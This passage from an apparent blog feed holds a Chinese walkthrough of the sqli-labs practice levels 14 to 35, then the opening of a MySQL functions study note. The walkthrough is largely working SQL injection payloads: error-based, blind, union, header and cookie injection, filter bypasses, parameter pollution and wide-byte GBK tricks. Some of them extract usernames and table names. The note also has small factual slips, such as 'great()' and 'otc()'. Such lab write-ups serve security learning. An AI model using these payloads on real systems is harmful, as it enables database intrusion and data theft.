<p>然后一步步可以得到所有信息</p>
<h1 id="LESS-14"><a href="#LESS-14" class="headerlink" title="LESS-14"></a>LESS-14</h1><p>直接换双引号闭合<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin" or 1=1#&amp;passwd=1</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-15"><a href="#LESS-15" class="headerlink" title="LESS-15"></a>LESS-15</h1><p>单引号闭合即可<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin" or 1=1#&amp;passwd=1</span><br></pre></td></tr></table></figure></p>
<p>也可以延时注入<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' and if(ascii(substr(database(),1,1))=119,1,sleep(5))#&amp;passwd=admin</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-16"><a href="#LESS-16" class="headerlink" title="LESS-16"></a>LESS-16</h1><p>payload<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin") or 1=1#&amp;passwd=1</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-17"><a href="#LESS-17" class="headerlink" title="LESS-17"></a>LESS-17</h1><p>本关是一个涉及数据库的增删查改的问题，发现对数据库的username输入进行了过滤，但是对password没有过滤。<br>报错注入payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))#&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
<p>也可以延时注入，但是延时注入会修改数据库内容，不建议使用。</p>
<p>接下来三关是对header头的注入</p>
<h1 id="LESS-18"><a href="#LESS-18" class="headerlink" title="LESS-18"></a>LESS-18</h1><p>截取Header头进行修改，由于username和password参数都进行了检查，故无法从这两个地方注入。<br>修改User-Agent，利用报错进行注入<br>payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
<p>这个在本题不可以用，但是可以报错，<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-19"><a href="#LESS-19" class="headerlink" title="LESS-19"></a>LESS-19</h1><p>只是将注入位置换为referer即可</p>
<h1 id="LESS-20"><a href="#LESS-20" class="headerlink" title="LESS-20"></a>LESS-20</h1><p>用cookie注入,这里我用的是火狐的Cookie Manager插件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumb' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure></p>
<p>然后可以继续注入获取全部内容。</p>
<h1 id="LESS-21"><a href="#LESS-21" class="headerlink" title="LESS-21"></a>LESS-21</h1><p>本题与20题方法一样，只是闭合方法不同，还有要对payload进行base64编码。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumb') and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure></p>
<p>再用base64编码<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RHVtYicpIGFuZCB<span class="number">1</span>cGRhdGV<span class="number">4</span>bWwoMSxjb<span class="number">25</span>jYXQoMH<span class="name">g3</span>ZSwoc<span class="number">2</span><span class="attr">VsZWN0</span>IGdyb<span class="number">3</span>VwX<span class="number">2</span><span class="symbol">NvbmNhdCh0</span>YWJsZV<span class="number">9</span>uYW<span class="number">1</span>lKSBmc<span class="name">m9</span>tIGluZ<span class="name">m9</span>ybWF<span class="number">0</span>aW<span class="number">9</span>uX<span class="number">3</span><span class="symbol">NjaGVtYS50</span>YWJsZXMgd<span class="number">2</span>hlcmUgdGFibGVfc<span class="number">2</span><span class="symbol">NoZW1</span>hPWRhdGFiYX<span class="symbol">NlKCkpLDB4</span><span class="symbol">N2</span>UpLDEpIw<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span><span class="number">3</span>d</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-22"><a href="#LESS-22" class="headerlink" title="LESS-22"></a>LESS-22</h1><p>与21关相同只是闭合方式变成了双引号<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RHVtYiIgYW<span class="number">5</span>kIHVwZGF<span class="number">0</span>ZXhtbCgxLG<span class="symbol">NvbmNhdCgweDdlLChzZWxlY3</span>QgQEB<span class="number">2</span>ZXJzaW<span class="number">9</span>uKSwweDdlKSwxKSM<span class="meta">%</span><span class="number">3</span>d</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-23"><a href="#LESS-23" class="headerlink" title="LESS-23"></a>LESS-23</h1><p>此题过滤了—和#注释符，构造payload闭合 <code>?id=1’ and ‘a’=’a</code>，继续获取文件路径<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="comment">@@</span>datadir,'a</span><br></pre></td></tr></table></figure></p>
<p>获取表名<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),'a</span><br></pre></td></tr></table></figure></p>
<p>下面的不再演示，还可以报错注入，延时注入等<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>' <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> database()),<span class="number">0</span>x7e),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">'a'</span>=<span class="symbol">'a</span></span><br></pre></td></tr></table></figure></p>
<p>延时注入<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>)) and 'a'='a</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-24"><a href="#LESS-24" class="headerlink" title="LESS-24"></a>LESS-24</h1><p>本关看界面是用户创建密和修改密码等，考察的是二次排序注入(又叫存储型注入)。<br>先创建一个用户<strong><font face="cambrai">admin’#</font></strong>，如果修改密码，则会将admin用户的密码修改。SQL语句就变为<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> paddwd=<span class="string">'new_pass'</span> <span class="keyword">where</span> username=<span class="string">'admin'</span>#<span class="string">' and password='</span></span><br></pre></td></tr></table></figure></p>
<p>相当于执行了<strong><font face="cambrai">update users set password=’$new_pass’ where username=’admin’</font></strong>，从而更改了用户名。</p>
<h1 id="LESS-25"><a href="#LESS-25" class="headerlink" title="LESS-25"></a>LESS-25</h1><p>单引号闭合联合注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'a</span></span><br></pre></td></tr></table></figure></p>
<p>本题要绕过and和or，有常用的几个方法</p>
<blockquote>
<p>(1)大小写变形，如Or,oR,OR<br>(2)编码，hex,urlencode<br>(3)添加注释/*or*/<br>(4)利用符号 and=&amp;&amp; ,or=||<br>(5)重复输入anandd</p>
</blockquote>
<p>利用方法4<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' || updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) || <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-25a"><a href="#LESS-25a" class="headerlink" title="LESS-25a"></a>LESS-25a</h1><p>本关没有错误回显，所以不能用报错注入。并没有引号限制，可以联合注入<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">database</span>(),3<span class="comment">#</span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-26"><a href="#LESS-26" class="headerlink" title="LESS-26"></a>LESS-26</h1><p>由于空格注释符等都被过滤掉了，其他的符号Windows下不能用，可以用不带空格的报错注入。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0'||extractvalue(1, concat(0x5c, (database())))||'1'='1</span><br></pre></td></tr></table></figure></p>
<p>然后继续注入<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>'||extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(select(group_concat(username))from(users))))||'<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>对于空格常用的方法为：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">编码</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">%09</td>
<td style="text-align:center">TAB键(水平)</td>
</tr>
<tr>
<td style="text-align:center">%0a</td>
<td style="text-align:center">新建一行</td>
</tr>
<tr>
<td style="text-align:center">%0c</td>
<td style="text-align:center">新的一页</td>
</tr>
<tr>
<td style="text-align:center">%0d</td>
<td style="text-align:center">return功能</td>
</tr>
<tr>
<td style="text-align:center">%0b</td>
<td style="text-align:center">TAB键(垂直)</td>
</tr>
<tr>
<td style="text-align:center">%a0</td>
<td style="text-align:center">空格</td>
</tr>
</tbody>
</table>
</div>
<h1 id="LESS-26a"><a href="#LESS-26a" class="headerlink" title="LESS-26a"></a>LESS-26a</h1><p>本关无法回显错误，无法使用报错注入，还有闭合方式为 <code>?id=1’)</code><br>盲注payload：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="symbol">'anandd</span>(<span class="keyword">select</span>(substr((<span class="keyword">select</span>(database())),<span class="number">1</span>,<span class="number">1</span>)))=<span class="symbol">'s</span></span><br></pre></td></tr></table></figure></p>
<p>联合注入<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">555</span>')union(select(<span class="number">1</span>),(user()),'<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>爆用户名<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">555</span>')union(select(<span class="number">1</span>),group_concat(username),(<span class="number">2</span>)from(users)where(<span class="number">1</span>=<span class="number">1</span>))union(select(<span class="number">1</span>),(<span class="number">2</span>),'a</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-27"><a href="#LESS-27" class="headerlink" title="LESS-27"></a>LESS-27</h1><p>本题过滤了select和上关的字符，可以大小写混合绕过<br>报错注入payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0'||extractvalue(1, concat(0x5c, (<span class="keyword">seleCt</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)=<span class="keyword">database</span>())))||<span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-27a"><a href="#LESS-27a" class="headerlink" title="LESS-27a"></a>LESS-27a</h1><p>本题双引号闭合，无法报错。盲注payload：<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0"||(<span class="keyword">SelEct</span>(<span class="built_in">substr</span>((<span class="keyword">SelecT</span>(<span class="keyword">database</span>())),<span class="number">1</span>,<span class="number">1</span>)))=<span class="string">"s</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-28"><a href="#LESS-28" class="headerlink" title="LESS-28"></a>LESS-28</h1><p>与前面没有太大区别，盲注payload<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=888')||(<span class="keyword">SelecT</span>(<span class="built_in">substr</span>((<span class="keyword">SelEct</span>(<span class="keyword">database</span>())),<span class="number">1</span>,<span class="number">1</span>)))=(<span class="string">'s</span></span><br></pre></td></tr></table></figure></p>
<p>联合注入<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">888</span>')unIon(<span class="keyword">Select</span>(<span class="number">1</span>),database(),<span class="symbol">'a</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-28a"><a href="#LESS-28a" class="headerlink" title="LESS-28a"></a>LESS-28a</h1><p>本题知识简单过滤了union等符号，联合注入<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">555</span>')unIon(SeLect <span class="number">1</span>,database(),'<span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-29"><a href="#LESS-29" class="headerlink" title="LESS-29"></a>LESS-29</h1><p>注意：本题的index.php页面没有任何防护，注册页面是在login.php页面</p>
<p>在login.php文件中，传入的参数会被分为两组，分组符号为&amp;，那么构造payload，以&amp;分组即可<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username),<span class="number">2</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>本关为HPP(http参数污染)攻击,具体参见百度</p>
<h1 id="LESS-30"><a href="#LESS-30" class="headerlink" title="LESS-30"></a>LESS-30</h1><p>与29关相同，只是闭合方式改为<font face="futura">“</font><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1" union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username),<span class="number">2</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-31"><a href="#LESS-31" class="headerlink" title="LESS-31"></a>LESS-31</h1><p>与前面的相同，只是闭合方式变了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>原理：</p>
<blockquote>
<p>mysql在使用GBK编码的时候，会把两个字符作为一个汉字，例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围)。我们在过滤<font>‘</font>的时候，往往利用的思路是将<strong><font face="futura">‘</font></strong>转换为<strong><font face="futura">\’</font></strong>，因此我们的思路就是将’前面的\换掉。</p>
</blockquote>
<p>方法一般有两种：</p>
<blockquote>
<p>1、%df吃掉\\，具体的原因是urlencode(\\’)=%5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面的提到的mysql在GBK编码的时候两个字节当做一个汉字，此时%df%5c就是一个汉字，那么%27单独在外面，达到了我们的目的。<br>2、将<font face="futura">\\’</font>中的<font face="futura">\\</font>过滤掉，例如可以构造<font face="futura">%**%5c%5c%27</font>的情况，后面%5c会被前面的%5c给注释掉</p>
</blockquote>
<hr>
<h1 id="LESS-32"><a href="#LESS-32" class="headerlink" title="LESS-32"></a>LESS-32</h1><p>用第一种方法绕过<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="symbol">%df</span><span class="symbol">%27</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure></p>
<p>这个payload执行的sql语句是<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=<span class="string">'-1運'</span>union select 1,user(),3;</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-33"><a href="#LESS-33" class="headerlink" title="LESS-33"></a>LESS-33</h1><p>这个和上一题没什么区别，同样的payload也可以用<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="symbol">%df</span><span class="symbol">%27</span>union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,@<span class="title">@basedir--</span>+</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-34"><a href="#LESS-34" class="headerlink" title="LESS-34"></a>LESS-34</h1><p>本关是post型的注入漏洞，同样也是进行了<font face="futura">‘\</font>&gt;的处理，所以就是像上面一样将<font face="futura">\</font>给吃掉，我们此处介绍一个方法，将utf-8转换为utf-16或utf-32，例如将<font face="futura">‘</font>转为utf-16为<font face="futura">♦’</font>，我们利用这个方式尝试。payload<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=♦' <span class="keyword">or</span> <span class="attribute">1</span>=1#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
<p>继续的话可以<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=♦' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">2</span>,<span class="comment">@@</span>basedir<span class="meta">#&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-35"><a href="#LESS-35" class="headerlink" title="LESS-35"></a>LESS-35</h1><p>本关和前面的过滤一样，只是没有加引号闭合，所以就更简单了<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">database</span>(),3<span class="comment">#</span></span></span><br></pre></td></tr></table></figure></p>
<p>在后面的时候有个数字型注入，编码绕过即可<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1 union select 1,group_concat(column_name),3 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=0x7573657273--+</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL学习笔记(五)]]></title>
      <url>/2018/02/07/mysql5/</url>
      <content type="html"><![CDATA[<p>MySQL语言结构<br><a id="more"></a></p>
<h1 id="MySQL语言简介"><a href="#MySQL语言简介" class="headerlink" title="MySQL语言简介"></a><strong>MySQL语言简介</strong></h1><p>在MySQL数据库中，SQL语言有以下四部分组成</p>
<p>(1)数据定义语言(Data Definition Language,DDL)，用于执行的对数据库的操作，例如 <code>create</code>、 <code>alter</code>等。<br>(2)数据操纵语言(Data Manipulation Language,DML),用于操纵数据库，比如 <code>select</code>、 <code>insert</code>等。<br>(3)数据控制语言(Data Control Language),比如授予和收回权限 <code>grant</code> 和 <code>revoke</code><br>(4)MySQL增加的语言元素，比如变量常量等。</p>
<h1 id="部分常量值"><a href="#部分常量值" class="headerlink" title="部分常量值"></a><strong>部分常量值</strong></h1><h2 id="十六进制常量"><a href="#十六进制常量" class="headerlink" title="十六进制常量"></a><strong>十六进制常量</strong></h2><p>十六进制常量通常被当做字符串来存储，在字符串前面加一个x或者X，注意数字不能超出16进制的范围，如果在前面几加0x的话就不需要加引号了，十六进制默认作为字符串来处理，如果想作为数字处理的话，使用 <em>CAST(… AS UNSIGNED)</em> 语句，比如 <code>select 0x41,cast(0x41 as unsigned);</code>, <code>HEX()</code>函数可将字符串转换为十六进制。</p>
<h2 id="位字段值"><a href="#位字段值" class="headerlink" title="位字段值"></a><strong>位字段值</strong></h2><p>一般使用b’value’来表示二进制值。 <code>BIN()</code>可以把位字段常量转为二进制显示， <code>OCT()</code>转为数字显示。</p>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h1><h2 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a><strong>用户变量</strong></h2><p>语法格式</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> @<span class="attribute">user_variables1</span>=expression1[,<span class="attribute">user_variables2</span>=expression2...]</span><br></pre></td></tr></table></figure>
<h2 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a><strong>系统变量</strong></h2><p>分为全局变量(GLOBAL)和局部变量(LOCAL &#124; SESSION)</p>
<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a><strong>常用函数</strong></h1><h2 id="1、数学函数-数学函数支持嵌套使用"><a href="#1、数学函数-数学函数支持嵌套使用" class="headerlink" title="1、数学函数(数学函数支持嵌套使用)"></a>1、数学函数(数学函数支持嵌套使用)</h2><h3 id="1、great-和-least-函数：-获取一组数中的最大值和最小值"><a href="#1、great-和-least-函数：-获取一组数中的最大值和最小值" class="headerlink" title="1、great() 和 least()函数： 获取一组数中的最大值和最小值"></a>1、<em>great()</em> 和 <em>least()函数</em>： 获取一组数中的最大值和最小值</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">great(1,2,3)<span class="comment">--&gt;3     least(1,2,3)--&gt;1</span></span><br></pre></td></tr></table></figure>
<p>注意：MySQL中函数名与括号之间不能有空格</p>
<h3 id="2、-floor-和-ceiling-函数"><a href="#2、-floor-和-ceiling-函数" class="headerlink" title="2、 floor() 和 ceiling() 函数"></a>2、 <em>floor()</em> 和 <em>ceiling()</em> 函数</h3><blockquote>
<p><em>floor()</em> 函数用于获得小于一个整数的最大整数值，<em>ceiling</em> 用于获得大于一个整数的最小整数值。</p>
</blockquote>
<h3 id="3、-round-和-truncate"><a href="#3、-round-和-truncate" class="headerlink" title="3、 round() 和 truncate()"></a>3、 <em>round()</em> 和 <em>truncate()</em></h3><blockquote>
<p><em>round()</em> 用于获得一个数的四舍五入的整数值。</p>
<p><em>truncate(a,b)</em> 用于把一个数字a截取为一个指定小数位数b的数字</p>
</blockquote>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate<span class="function"><span class="params">(<span class="number">1.54578</span>,<span class="number">2</span>)</span>--&gt;</span><span class="number">1.54</span></span><br></pre></td></tr></table></figure>
<h3 id="4、-abs-函数"><a href="#4、-abs-函数" class="headerlink" title="4、 abs() 函数"></a>4、 <em>abs()</em> 函数</h3><blockquote>
<p>获取绝对值</p>
</blockquote>
<h3 id="5、-sign-函数"><a href="#5、-sign-函数" class="headerlink" title="5、 sign() 函数"></a>5、 <em>sign()</em> 函数</h3><blockquote>
<p>返回数字的符号，返回的结果是正数(1)，负数(-1)、或者零(0)</p>
</blockquote>
<h3 id="6、-sqrt-函数"><a href="#6、-sqrt-函数" class="headerlink" title="6、 sqrt() 函数"></a>6、 <em>sqrt()</em> 函数</h3><blockquote>
<p>返回平方根</p>
</blockquote>
<h3 id="7、-pow-函数"><a href="#7、-pow-函数" class="headerlink" title="7、 pow() 函数"></a>7、 <em>pow()</em> 函数</h3><blockquote>
<p>pow(a,b)—&gt; a^b</p>
</blockquote>
<h3 id="8、-bin-、-otc-、-hex-函数"><a href="#8、-bin-、-otc-、-hex-函数" class="headerlink" title="8、 bin() 、 otc() 、 hex() 函数"></a>8、 <em>bin()</em> 、 <em>otc()</em> 、 <em>hex()</em> 函数</h3><blockquote>
<p>分别返回一个数的二进制、八进制和十六进制值，作为字符串返回</p>
</blockquote>
<h2 id="2、聚合函数"><a href="#2、聚合函数" class="headerlink" title="2、聚合函数"></a>2、聚合函数</h2><p>比如 <em>count()</em>, <em>sum()</em> 等</p>
<h2 id="3、字符串函数"><a href="#3、字符串函数" class="headerlink" title="3、字符串函数"></a>3、字符串函数</h2><h3 id="1、-ascii-char-函数"><a href="#1、-ascii-char-函数" class="headerlink" title="1、 ascii(char) 函数"></a>1、 <em>ascii(char)</em> 函数</h3><blockquote>
<p>返回字符表达式最左端字符的ASCII值，返回值为整型</p>
</blockquote>
<h3 id="2、-char-函数"><a href="#2、-char-函数" class="headerlink" title="2、 char() 函数"></a>2、 <em>char()</em> 函数</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">char</span>(<span class="params">x1,x2,x3,...</span>)</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>将x1,x2,x3的ascii码转换为字符，组成一个字符串。</p>
</blockquote>
<h3 id="3、-left-和-right-函数"><a href="#3、-left-和-right-函数" class="headerlink" title="3、 left() 和 right 函数"></a>3、 <em>left()</em> 和 <em>right</em> 函数</h3><p><code>left&#124;right (str,x)</code> 返回字符串str左边或右边的前x个字符</p>
<h3 id="4、-trim-和-ltrim-和-rtrim-函数"><a href="#4、-trim-和-ltrim-和-rtrim-函数" class="headerlink" title="4、 trim 和 ltrim 和 rtrim 函数"></a>4、 <em>trim</em> 和 <em>ltrim</em> 和 <em>rtrim</em> 函数</h3><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">trim</span>|<span class="built_in">ltrim</span>|<span class="built_in">rtrim</span>(str)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><em>ltrim</em> 和 <em>rtrim</em> 分别删除字符串左边和右边的空格，<em>trim</em> 则删除左右两边的空格。</p>
</blockquote>
<h3 id="5、-rpad-和-lpad-函数"><a href="#5、-rpad-和-lpad-函数" class="headerlink" title="5、 rpad() 和 lpad 函数"></a>5、 <em>rpad()</em> 和 <em>lpad</em> 函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpad|lpad(str,n,pad)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>用字符串pad对字符串str左边后右边进行填充，直到str的字符数目得到n个，若str的字符个数大于n，则返回前n个字符</p>
</blockquote>
<h3 id="6、-replace-str1-str2-str3-函数"><a href="#6、-replace-str1-str2-str3-函数" class="headerlink" title="6、 replace(str1,str2,str3) 函数"></a>6、 <em>replace(str1,str2,str3)</em> 函数</h3><blockquote>
<p>用字符串str3替换str1中所有出现的字符串str2。</p>
</blockquote>
<h3 id="7、-concat-s1-s2-s3-…"><a href="#7、-concat-s1-s2-s3-…" class="headerlink" title="7、 concat(s1,s2,s3,…)"></a>7、 <em>concat(s1,s2,s3,…)</em></h3><blockquote>
<p>字符串连接函数</p>
</blockquote>
<h3 id="8、-substring-expr-start-length"><a href="#8、-substring-expr-start-length" class="headerlink" title="8、 substring(expr,start,length)"></a>8、 <em>substring(expr,start,length)</em></h3><blockquote>
<p>返回指定长度的子串</p>
</blockquote>
<h3 id="9、-strcmp-s1-s2"><a href="#9、-strcmp-s1-s2" class="headerlink" title="9、 strcmp(s1,s2)"></a>9、 <em>strcmp(s1,s2)</em></h3><blockquote>
<p>字符串比较函数</p>
</blockquote>
